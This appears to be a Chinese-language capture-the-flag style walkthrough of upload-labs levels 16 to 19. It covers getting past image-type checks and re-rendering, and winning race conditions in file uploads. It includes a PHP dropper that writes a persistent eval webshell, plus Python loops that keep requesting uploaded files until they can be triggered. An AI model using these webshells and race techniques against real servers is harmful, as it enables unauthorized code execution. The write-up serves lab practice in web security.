@@ -1,0 +1,53 @@
+Pass-16（exif_imagetype图片马）
+知识补充： exif_imagetype()读取一个图像的第一个字节并检查其后缀名。
+返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启php_exif模块。
+所以还是可以用第十四关的图片马绕过，并使用文件包含漏洞解析图片马
+
+Pass-17（二次渲染绕过）
+这一关对上传图片进行了判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，但是后端二次渲染需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话，使用蚁剑进行连接
+
+
+Pass-18（条件竞争一）
+打开第十八关，通过提示发现跟以前的都不一样
+从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件
+这么看来如果我们还是上传一个图片马的话，网站依旧存在文件包含漏洞我们还是可以进行利用。但是如果没有文件包含漏洞的话，我们就只能上传一个php木马来解析运行了。
+是的 这一关没有文件包含漏洞
+那还怎么搞？上传上去就被删除了，我还怎么去访问啊。
+不慌不慌，要知道代码执行的过程是需要耗费时间的。如果我们能在上传的一句话被删除之前访问不就成了。这个也就叫做条件竞争上传绕过。
+我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。
+
+zoe.php
+<?php fputs(fopen('Tony.php','w'),'<?php @eval($_POST["Tony"])?>');?>
+把这个php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个Tony.php的一句话。在正常的渗透测试中这也是个好办法。因为单纯的去访问带有phpinfo()的文件并没有什么效果。一旦删除了还是无法利用。但是这个办法生成的Tony.php服务器是不会删除的，我们就可以通过蚁剑去链接了。
+
+import requests
+url = "http://xxx.xxx.xxx.xxx/upload-labs/upload/zoe.php"
+while True:
+    html = requests.get(url)
+    if html.status_code == 200:
+        print("OK")
+        break
+如果返回200 说明已经服务器还没来得及删除 而且这个时候Tony.php这个真正的web shell肯定就会生成！
+
+
+
+
+Pass-19（条件竞争二）
+从源码来看的话，服务器先是将文件后缀跟白名单做了对比，然后检查了文件大小以及文件是否已经存在。文件上传之后又对其进行了重命名。
+关键是重命名
+这么看来的话，php是不能上传了，只能上传图片马了
+而且需要在图片马没有被重命名之前访问它！！！！！所以也是用python不停的访问然后生成新web shell
+要让图片马能够执行还要配合其他漏洞，比如文件包含，apache解析漏洞等。
+这里还是将前一关的代码插入图片作出图片马。然后通过文件包含去访问该图片马。
+然后我们要修改一下python脚本，不能再用回第18关的脚本了，这里脚本要修改为文件包含来访问（由于隐私原因，IP地址不能放出来，下面的脚本的url地址XXX都是代表IP地址）
+
+import requests
+url = "http://xxx.xxx.xxx.xx/upload-labs/include.php?file=upload/pass19.png"
+while True:
+    html = requests.get(url)
+    if ( 'Warning'  not in  str(html.text)):
+        print('ok')
+        break
+
+
+https://blog.csdn.net/weixin_47598409/article/details/115050869
